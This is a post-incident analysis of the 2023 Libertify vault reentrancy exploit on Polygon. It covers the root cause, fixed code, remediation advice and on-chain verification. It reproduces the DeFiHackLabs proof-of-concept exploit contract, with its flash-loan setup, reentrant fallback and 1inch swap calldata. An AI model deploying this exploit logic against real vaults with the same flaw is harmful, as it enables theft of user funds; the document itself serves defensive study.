# Libertify — Deposit Reentrancy Attack Analysis (2023)

| Item | Details |
|------|------|
| **Date** | 2023-07-11 |
| **Protocol** | Libertify (LibertiVault) |
| **Chain** | Polygon |
| **Loss** | ~$452,000 USD (Ethereum ~$162K + Polygon ~$290K) |
| **Attacker** | [0xfd2d...6d02](https://polygonscan.com/address/0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02) |
| **Attack Contract** | [0xdfcd...2969](https://polygonscan.com/address/0xdfcdb5a86b167b3a418f3909d6f7a2f2873f2969) |
| **Attack Tx** | [0x7320...8483](https://polygonscan.com/tx/0x7320accea0ef1d7abca8100c82223533b624c82d3e8d445954731495d4388483) |
| **Vulnerable Contract** | [0x9c80...447b](https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b) (LibertiVault) |
| **Root Cause** | The `deposit()` function allowed an external 1inch swap callback without reentrancy protection, enabling double share minting within the same transaction |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Libertify_exp.sol) |

---

## 1. Vulnerability Overview

Libertify is an automated DeFi vault protocol operating on Polygon that manages user-deposited assets according to strategies and distributes yields. When a user deposits, the `deposit(uint256 assets, address receiver, bytes calldata data)` function is called, which internally performs a token swap via the 1inch V4 Router.

The core vulnerability lies in the fact that when `deposit()` calls the 1inch Router, it triggers an external `IAggregationExecutor.callBytes()` callback. An attacker could register their own contract as the `IAggregationExecutor` and thereby control this callback entry point. Because `deposit()` had **no reentrancy protection (`nonReentrant`)**, the attacker was able to re-invoke `deposit()` mid-callback and obtain duplicate vault shares.

The attacker borrowed 5,000,000 USDT via an Aave V2 flash loan, then exploited this reentrancy path to mint more than double the vault shares against the same USDT collateral. They then called `exit()` to redeem the over-minted shares for WETH and USDT, stealing approximately $452,000.

Two vulnerabilities were combined:

1. **Reentrancy vulnerability**: `deposit()` could be re-called during execution of the external callback (`callBytes`)
2. **Share over-minting**: At the point of reentry, the vault balance had not yet been updated, causing shares to be calculated twice against the same asset base

---

## 2. Vulnerable Code Analysis

### 2.1 `LibertiVault.deposit()` — External Callback Without Reentrancy Lock (Core Vulnerability)

**Vulnerable code (inferred)**:
```solidity
// ❌ Vulnerability: external 1inch swap callback allowed without nonReentrant
function deposit(
    uint256 assets,        // deposit amount (in WETH)
    address receiver,      // share recipient address
    bytes calldata data    // 1inch swap calldata (attacker-controlled)
) external returns (uint256 shares) {
    // Calculate shares based on current vault balance (same value reused on reentry)
    uint256 vaultBalance = token0.balanceOf(address(this))
                         + token1.balanceOf(address(this));

    // ❌ Issue 1: No state (balance) update before calling external swap router
    // ❌ Issue 2: 1inch Router executes attacker-controlled callBytes()
    //           At this point the attacker can re-call deposit()
    oneInchRouter.swap(aggregationExecutor, swapDesc, data);

    // Calculate shares from balance increase after swap
    uint256 newBalance = token0.balanceOf(address(this))
                       + token1.balanceOf(address(this));
    shares = (newBalance - vaultBalance) * totalSupply / vaultBalance;

    // ❌ Issue 3: On reentry, vaultBalance still holds the stale value,
    //           distorting share ratio calculation and minting excess shares
    _mint(receiver, shares);
    return shares;
}
```

**Fixed code**:
```solidity
// ✅ Apply OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LibertiVault is ReentrancyGuard {

    // ✅ nonReentrant modifier blocks reentrancy at the source
    function deposit(
        uint256 assets,
        address receiver,
        bytes calldata data
    ) external nonReentrant returns (uint256 shares) {
        uint256 vaultBalanceBefore = token0.balanceOf(address(this))
                                   + token1.balanceOf(address(this));

        // ✅ Execute external swap under reentrancy lock
        oneInchRouter.swap(aggregationExecutor, swapDesc, data);

        uint256 vaultBalanceAfter = token0.balanceOf(address(this))
                                  + token1.balanceOf(address(this));

        // ✅ Calculate shares from actual increase only
        uint256 delta = vaultBalanceAfter - vaultBalanceBefore;
        require(delta > 0, "No deposit amount");
        shares = delta * totalSupply / vaultBalanceBefore;

        _mint(receiver, shares);
        return shares;
    }
}
```

**Problem**: When `deposit()` calls `oneInchRouter.swap()`, the router internally executes `IAggregationExecutor(caller).callBytes(msgSender, data)`. The attacker passed their own contract address as the `caller` parameter and re-called `LibertiVault.deposit()` from within the `callBytes()` implementation. At the point of reentry, the vault's balance (`vaultBalance`) still holds the stale pre-update value, distorting the share ratio calculation and minting far more shares than warranted.

---

### 2.2 `fallback()` — Reentrancy Trigger and USDT Transfer

The attacker contract's `fallback()` function serves as the `callBytes()` implementation:

**Vulnerable point (attacker contract)**:
```solidity
// Attacker contract — acting as IAggregationExecutor
fallback() external payable {
    nonce++;
    // Execute reentry only on odd-numbered callbacks (prevents infinite loop)
    if (nonce % 2 == 1) {
        bytes memory callData = setData();
        // ❌ Re-call LibertiVault.deposit() — reentrancy!
        LibertiVault.deposit(0.001 ether, address(this), callData);
    }
    // Transfer USDT to the vault to simulate swap completion
    USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);
}
```

This design produces the following execution order: first `deposit()` call → `callBytes()` → reentrant second `deposit()` → `callBytes()` → only USDT transfer (no reentry) → second deposit completes with share minting ① → first deposit completes with share minting ②.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker deploys an attack contract implementing the `IAggregationExecutor` interface
- Implements reentrancy logic with `nonce`-based branching inside `fallback()`
- Holds 0.004 ETH WETH as initial balance (via `deal` or pre-acquired)
- Sets `approve(max)` on LibertiVault for WETH

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. testExploit() — Attack begins                                     │
│    Aave V2.flashLoan(USDT, 5,000,000e6)                              │
│    → Receives 5,000,000 USDT flash loan                              │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ executeOperation() callback
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 2. executeOperation() — First flash loan handler                     │
│    USDT.approve(aaveV2, max)                                         │
│    callData = setData()   ← Sets attacker as AggregationExecutor     │
│    LibertiVault.deposit(0.001 ether, this, callData)  ← [1st call]  │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ deposit() calls 1inch swap internally
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 3. 1inch Router → callBytes(attackerContract, data)                  │
│    → Enters fallback() (nonce=1, odd)                                │
│                                                                      │
│    ┌──────────────────────────────────────────────────────────┐     │
│    │ 4. [Reentry] LibertiVault.deposit(0.001 ether, this, data) │     │
│    │    → 1inch Router → callBytes(attacker, data)             │     │
│    │    → Enters fallback() (nonce=2, even)                    │     │
│    │    → Transfers 2,500,000 USDT to 1inch Router             │     │
│    │    → Second deposit completes, shares minted ①            │     │
│    └──────────────────────────────────────────────────────────┘     │
│                                                                      │
│    First deposit also completes share minting ②                      │
│    (vaultBalance still holds stale value → shares over-minted)       │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 5. LibertiVault.exit()                                               │
│    → Burns all over-minted shares and withdraws WETH + USDT         │
│    → ~123.84 WETH (~$276,000) + USDT recovered                      │
└──────────────────────────┬──────────────────────────────────────────┘
                           │ If balance insufficient
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 6. WETHToUSDT() — Cover shortfall                                    │
│    Uniswap V3 exactOutputSingle() swaps WETH → USDT                 │
│    → Acquires enough to repay Aave flash loan principal + fee        │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 7. Aave V2 flash loan repaid (USDT 5,000,000 + fee)                  │
│    → Second flashLoan() repeated in same manner                      │
│    → Final net profit of ~$452,000 extracted                         │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Details |
|------|------|
| Flash loan principal | USDT 5,000,000 × 2 rounds (10,000,000 USDT total) |
| Stolen assets | WETH ~123.84 ETH (~$276K) + USDT |
| Polygon loss | ~$290,000 USD |
| Ethereum loss | ~$162,000 USD (separate attack transaction) |
| **Total loss** | **~$452,000 USD** |
| User impact | ~$230 (majority was team's own operating funds) |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// =========================================================
// Core attack logic excerpt — Libertify_exp.sol
// =========================================================

// [Step 1] Attack entry: procure large USDT via Aave V2 flash loan
function testExploit() external {
    deal(address(WETH), address(this), 0.004 ether);   // initialize small WETH amount
    WETH.approve(address(LibertiVault), type(uint256).max);

    address[] memory assets = new address[](1);
    assets[0] = address(USDT);
    uint256[] memory amounts = new uint256[](1);
    amounts[0] = 5_000_000 * 1e6;     // 5M USDT flash loan
    uint256[] memory modes = new uint256[](1);
    modes[0] = 0;                       // flash loan mode (repayment required)

    // Repeat twice to maximize profit
    aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    aaveV2.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

// [Step 2] Flash loan callback: over-mint shares via deposit → exit sequence
function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address initiator,
    bytes calldata params
) external returns (bool) {
    USDT.approve(address(aaveV2), type(uint256).max);

    // Build calldata designating attacker contract as AggregationExecutor
    bytes memory callData = setData();

    // [Key] Call deposit → triggers reentrant deposit via internal callback
    LibertiVault.deposit(0.001 ether, address(this), callData);

    // Redeem all over-minted shares
    LibertiVault.exit();

    // Convert WETH → USDT if insufficient for flash loan repayment
    if (USDT.balanceOf(address(this)) < (amounts[0] + premiums[0])) {
        WETHToUSDT(amounts[0], premiums[0]);
    }
    return true;
}

// [Step 3] Reentrancy trigger: fallback() acts as callBytes()
fallback() external payable {
    nonce++;
    if (nonce % 2 == 1) {   // odd nonce → execute reentry
        bytes memory callData = setData();
        // ← Reentry: re-calls LibertiVault.deposit() before the first call has completed
        LibertiVault.deposit(0.001 ether, address(this), callData);
    }
    // even nonce (or no reentry) → only transfer USDT to vault
    USDT.transfer(address(inchV4Router), 2_500_000 * 1e6);
}

// [Step 4] Build 1inch swap calldata: set attacker as Executor
function setData() internal view returns (bytes memory data) {
    IAggregationExecutor caller = IAggregationExecutor(address(this));
    oneInchV4Router.SwapDescription memory desc = oneInchV4Router.SwapDescription(
        WETH,                          // srcToken: WETH
        USDT,                          // dstToken: USDT
        payable(address(this)),        // srcReceiver: attacker
        payable(address(LibertiVault)),// dstReceiver: vault
        252_700 * 1e9,                 // amount
        1,                             // minReturnAmount (minimized)
        0,                             // flags
        ""
    );
    // 0x7c025200: 1inch V4 swap() function selector
    data = abi.encodeWithSelector(bytes4(0x7c025200), caller, desc, new bytes(1));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matched Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Deposit Reentrancy (External Call Reentrancy) | CRITICAL | CWE-841 | `01_reentrancy.md` | Reentrancy via 1inch callback |
| V-02 | Untrusted External Executor Allowed | HIGH | CWE-829 | `03_access_control.md` | Cream Finance 2021 |
| V-03 | CEI Pattern Violation (Balance Update Ordering) | HIGH | CWE-362 | `16_accounting_sync.md` | Euler Finance 2023 |
| V-04 | Flash Loan-Based Capital Amplification | MEDIUM | CWE-20 | `02_flash_loan.md` | bZx 2020 |

---

### V-01: Deposit Reentrancy (External Call Reentrancy)

- **Description**: When `deposit()` calls `swap()` on the 1inch V4 Router, the router internally executes `IAggregationExecutor.callBytes()`. If the attacker designates a contract implementing `callBytes()` as the `caller` parameter, they can re-invoke `deposit()` during the callback and mint additional shares before the vault state is updated.
- **Impact**: Share over-minting of 2× or more against the same assets → other users' assets drained on `exit()`.
- **Attack Conditions**: (1) No `nonReentrant` on `deposit()`, (2) attacker controls the `callBytes` callback of the 1inch Router, (3) vault balance not updated until swap completion.

---

### V-02: Untrusted External Executor Allowed

- **Description**: The protocol does not validate the `IAggregationExecutor` address embedded in the `data` parameter passed to `deposit()`. An attacker can designate an arbitrary contract as the Executor and execute malicious logic during the swap callback.
- **Impact**: Attacker-controlled code executes within the vault context, enabling reentrancy and fund manipulation.
- **Attack Conditions**: No whitelist or validation logic for the Executor address.

---

### V-03: CEI Pattern Violation

- **Description**: `deposit()` executes the external swap first, then calculates and mints shares. A balance snapshot is taken before the swap, but on reentry the same snapshot is reused, distorting the share ratio calculation.
- **Impact**: Excessive share minting via reentrancy, leading to protocol insolvency.
- **Attack Conditions**: Checks-Effects-Interactions order violated — state changes not completed before external call.

---

### V-04: Flash Loan-Based Capital Amplification

- **Description**: The attacker sourced 5,000,000 USDT via an uncollateralized flash loan from Aave V2 to maximize attack scale. Large-scale deposits were possible with no personal capital.
- **Impact**: Hundreds of thousands of dollars stolen with minimal personal capital (0.004 WETH).
- **Attack Conditions**: Access to a flash loan provider (Aave V2), vault accepts flash loan assets as deposits.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 1. Apply `nonReentrant` to the `deposit()` function

```solidity
// ✅ Inherit OpenZeppelin ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract LibertiVault is ReentrancyGuard {

    // ✅ Block reentrancy at the source
    function deposit(
        uint256 assets,
        address receiver,
        bytes calldata data
    ) external nonReentrant returns (uint256 shares) {
        // ...existing logic...
    }

    // ✅ Recommended: apply nonReentrant to exit() as well
    function exit() external nonReentrant returns (uint256, uint256) {
        // ...existing logic...
    }
}
```

#### 2. Apply Executor Address Whitelist

```solidity
// ❌ Current: arbitrary Executor allowed
// callBytes() executed with arbitrary address extracted from data parameter

// ✅ Fix: maintain a list of allowed Executors
mapping(address => bool) public allowedExecutors;

function setAllowedExecutor(address executor, bool allowed)
    external onlyOwner {
    allowedExecutors[executor] = allowed;
    emit ExecutorUpdated(executor, allowed);
}

function deposit(
    uint256 assets,
    address receiver,
    bytes calldata data
) external nonReentrant returns (uint256 shares) {
    // Parse executor address from calldata
    address executor = _extractExecutor(data);
    require(allowedExecutors[executor], "Executor not allowed");
    // ...
}
```

#### 3. Enforce CEI Pattern — Lock State Immediately After Balance Snapshot

```solidity
function deposit(
    uint256 assets,
    address receiver,
    bytes calldata data
) external nonReentrant returns (uint256 shares) {
    // ✅ [Checks] Input validation
    require(assets > 0, "Zero deposit amount");
    require(receiver != address(0), "Invalid receiver address");

    // ✅ [Effects] Tentative state update (fix balance before reentry)
    uint256 balanceBefore = _totalVaultValue();

    // ✅ [Interactions] External call
    oneInchRouter.swap(aggregationExecutor, swapDesc, data);

    // ✅ [Effects] Calculate shares from actual increase
    uint256 balanceAfter = _totalVaultValue();
    uint256 delta = balanceAfter - balanceBefore;
    require(delta >= assets, "Insufficient swap output");

    shares = totalSupply == 0
        ? delta
        : delta * totalSupply / balanceBefore;

    _mint(receiver, shares);
    emit Deposit(msg.sender, receiver, assets, shares);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Deposit Reentrancy (V-01) | Apply `nonReentrant` to all state-changing functions. Also defend cross-function reentrancy (deposit→exit) with a shared lock |
| Untrusted Executor (V-02) | Restrict Executor addresses to a governance-managed whitelist. Apply a timelock (48h+) for changes |
| CEI Violation (V-03) | Complete all internal state changes before any external call. Use static analysis tools (Slither/Echidna) to automate CEI pattern checks |
| Flash Loan Amplification (V-04) | Add guard logic to detect flash loan receipt followed immediately by deposit in the same transaction. Enforce a deposit cooldown (1 block) or flash loan origin detection |
| Audit Scope | Perform exhaustive reentrancy path analysis on all integration points with external DEX routers. Introduce formal audits + fuzz testing |

---

## 7. Lessons Learned

1. **DEX router integrations can open reentrancy vectors**: DEX aggregators like 1inch, 0x, and Paraswap internally execute user-controlled callbacks. Whenever a vault or pool performs swaps through such routers, always account for the possibility that the callback can reenter vault functions.

2. **`nonReentrant` is the default for any function involving external calls**: The assumption that "no ETH is being sent, so it's safe" is wrong. ERC20 transfers, DEX swaps, flash loan callbacks — all of these can serve as reentrancy vectors.

3. **Do not delegate Executor/Callback addresses to callers**: If the execution address of an external callback can be freely specified by the caller, an attacker can always inject a malicious contract. Executors must be restricted to a governance-approved whitelist.

4. **Vault share calculations are especially vulnerable to reentrancy**: ERC4626-style vaults that calculate shares from the pre/post-balance delta are susceptible to `balanceBefore` distortion on reentry, leading to share over-minting. All vaults with this calculation logic must be re-examined from a reentrancy perspective.

5. **Flash loans effectively reduce the capital barrier for attacks to zero**: As long as a vulnerability exists, anyone can mount a large-scale attack via flash loans. The assumption that "this is impractical because it requires large capital" does not hold in a protocol's security model.

6. **Apply the same security standards to test vaults and production vaults**: Libertify disclosed that 99% of lost funds were the team's own capital, but the vault's vulnerability structure exposed it to the same risk as production user funds. The distinction of "for testing" is meaningless to an attacker.

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Summary

| Item | Value |
|------|-----|
| Attack Tx | [0x7320...8483](https://polygonscan.com/tx/0x7320accea0ef1d7abca8100c82223533b624c82d3e8d445954731495d4388483) |
| Attacker (from) | [0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02](https://polygonscan.com/address/0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02) |
| Attack contract (to) | [0xdfcdb5a86b167b3a418f3909d6f7a2f2873f2969](https://polygonscan.com/address/0xdfcdb5a86b167b3a418f3909d6f7a2f2873f2969) |
| Attack block | 44,941,585 (PoC fork: 44,941,584) |
| Chain | Polygon |

### 8.2 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|-----------|
| Flash loan USDT | 5,000,000 USDT | 5,000,000 USDT | ✅ Match |
| Flash loan rounds | 2 | 2 (same Tx) | ✅ Match |
| WETH stolen | ~123.84 WETH | ~123.84 WETH (~$276K) | ✅ Match |
| Total loss (Polygon) | ~$290,000 | ~$290,000 | ✅ Match |
| Attack block | 44,941,584 (fork) | 44,941,585 (execution) | ✅ Close match |

### 8.3 On-Chain Event Log Sequence

75 events emitted per Polygonscan:

1. `Approval` — WETH → LibertiVault (attacker pre-approval)
2. `flashLoan` — Aave V2, USDT 5,000,000
3. `Approval` — USDT → Aave V2 (for repayment)
4. `deposit` — LibertiVault (1st deposit)
5. `swap` — 1inch V4 Router (triggers callBytes)
6. `deposit` — LibertiVault (reentrant 2nd deposit)
7. `Transfer` — USDT 2,500,000 → 1inch Router (within reentry)
8. `Transfer` — USDT 2,500,000 → 1inch Router (1st deposit completes)
9. `exit` — LibertiVault (shares burned + WETH/USDT withdrawn)
10. `swap` — Uniswap V3 (WETH → USDT, cover repayment shortfall)
11. `Transfer` — USDT flash loan principal + fee → Aave V2

### 8.4 Precondition Verification

| Item | Pre-Attack State |
|------|-------------|
| Attacker WETH balance | 0.004 ETH (handled via `deal()` in PoC) |
| LibertiVault WETH approve | type(uint256).max |
| Aave V2 USDT liquidity | At least 5,000,000 USDT available |
| Vulnerable contract | [0x9c80...447b](https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b) |

### 8.5 Reference Links

- **Polygonscan Tx**: https://polygonscan.com/tx/0x7320accea0ef1d7abca8100c82223533b624c82d3e8d445954731495d4388483
- **Attacker address**: https://polygonscan.com/address/0xfd2d3ffb05ad00e61e3c8d8701cb9036b7a16d02
- **Vulnerable vault**: https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b
- **Neptune Mutual analysis**: https://neptunemutual.com/blog/taking-a-closer-look-at-libertify-exploit/
- **DeFiHackLabs PoC**: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Libertify_exp.sol
- **Run PoC**: `forge test --contracts ./src/test/2023-07/Libertify_exp.sol -vvv`